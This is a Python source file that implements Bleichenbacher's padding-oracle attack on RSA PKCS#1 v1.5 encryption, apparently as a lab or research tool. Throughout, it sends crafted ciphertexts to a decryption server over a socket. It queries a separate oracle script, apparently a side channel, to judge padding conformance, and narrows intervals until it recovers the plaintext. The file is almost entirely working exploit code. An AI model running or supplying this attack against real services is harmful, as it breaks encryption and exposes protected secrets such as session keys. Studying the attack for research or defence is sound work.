import time
import subprocess
import multiprocessing
from collections import namedtuple

import utils
import my_math
import param

Interval = namedtuple("Interval", ["lower_bound", "upper_bound"])

def send_decrypt(ciphertext):
	# Setting up the request from the server
	# according to the server's protocol
	send_data = b'dec ' + str(len(ciphertext)).encode('ascii') + b'\0' + ciphertext

	while True:
		# Sending the data
		param.sock.sendall(send_data)

		# Cleaning the buffer, since the server does send back "DONE" or "ERROR"
		# but we don't need to check either way.
		param.sock.recv(param.max_message_size)

def oracle(ciphertext):
	# To monitor performance
	param.queries += 1
	t = time.perf_counter()
	if param.queries % param.print_queries_every == 0:
		print("Query #{} ({} s)".format(param.queries, round(t - param.t_start, 3)))
	
	# Starting sending the ciphertext to decrypt
	# (of course the server doesn't return the decryption)
	background_proc = multiprocessing.Process(target=send_decrypt, args=(ciphertext,))
	background_proc.start()

	# Calling the oracle 6 times
	# only if at least 5 times of them is conforming,
	# then we return conforming.
	fails_counter = 0
	is_conforming = True
	for i in range(param.number_of_time_to_confirm_conforming):
		if subprocess.call(param.cwd + "/../script/call_oracle.sh") == 0:
			fails_counter += 1
			if fails_counter >= 2:
				is_conforming = False
				break
		elif i == (param.number_of_time_to_confirm_conforming - 2) and fails_counter == 0:
			break # If we had 5 conforming tests, then no need to do the 6th
	
	background_proc.terminate()
	return is_conforming

# Step 2.A.
def find_smallest_s(lower_bound, c):
	"""
	Find the smallest s >= lower_bound,
	such that (c * s^e) (mod n) decrypts to a PKCS conforming string
	"""
	s = lower_bound

	while True:
		attempt = (c * pow(s, param.e, param.n)) % param.n
		attempt = utils.integer_to_bytes(attempt)

		if oracle(attempt):
			return s

		s += 1

# Step 2.C.
def find_s_in_range(a, b, prev_s, B, c):
	"""
	Given the interval [a, b], reduce the search
	only to relevant regions (determined by r)
	and stop when an s value that gives
	a PKCS1 conforming string is found.
	"""
	ri = my_math.ceil(2 * (b * prev_s - 2 * B), param.n)

	while True:
		si_lower = my_math.ceil(2 * B + ri * param.n, b)
		si_upper = my_math.ceil(3 * B + ri * param.n, a)

		for si in range(si_lower, si_upper):
			attempt = (c * pow(si, param.e, param.n)) % param.n
			attempt = utils.integer_to_bytes(attempt)

			if oracle(attempt):
				return si

		ri += 1

def safe_interval_insert(M_new, interval):
	"""
	Deal with interval overlaps when adding a new one to the list
	"""

	for i, (a, b) in enumerate(M_new):

		# overlap found, construct the larger interval
		if (b >= interval.lower_bound) and (a <= interval.upper_bound):
			lb = min(a, interval.lower_bound)
			ub = max(b, interval.upper_bound)

			M_new[i] = Interval(lb, ub)
			return M_new

	# no overlaps found, just insert the new interval
	M_new.append(interval)

	return M_new

# Step 3.
def update_intervals(M, s, B):
	"""
	After found the s value, compute the new list of intervals
	"""

	M_new = []

	for a, b in M:
		r_lower = my_math.ceil(a * s - 3 * B + 1, param.n)
		r_upper = my_math.ceil(b * s - 2 * B, param.n)

		for r in range(r_lower, r_upper):
			lower_bound = max(a, my_math.ceil(2 * B + r * param.n, s))
			upper_bound = min(b, my_math.floor(3 * B - 1 + r * param.n, s))

			interval = Interval(lower_bound, upper_bound)

			M_new = safe_interval_insert(M_new, interval)

	M.clear()

	return M_new

def bleichenbacher(ciphertext):
	"""
	Perform Bleichenbacher attack as described in his paper.
	"""

	param.t_start = time.perf_counter()

	# Step 1. is only needed when the ciphertext is
	# not PKCS1 conforming

	# integer value of ciphertext
	c = utils.bytes_to_integer(ciphertext)

	B = 2 ** (8 * (param.k - 2))

	M = [Interval(2 * B, 3 * B - 1)]

	# Step 2.A.
	s = find_smallest_s(my_math.ceil(param.n, 3 * B), c)

	M = update_intervals(M, s, B)

	while True:
		# Step 2.B.
		if len(M) >= 2:
			s = find_smallest_s(s + 1, c)

		# Step 2.C.
		elif len(M) == 1:
			a, b = M[0]

			# Step 4.
			if a == b:
				return utils.integer_to_bytes(a % param.n)

			s = find_s_in_range(a, b, s, B, c)

		M = update_intervals(M, s, B)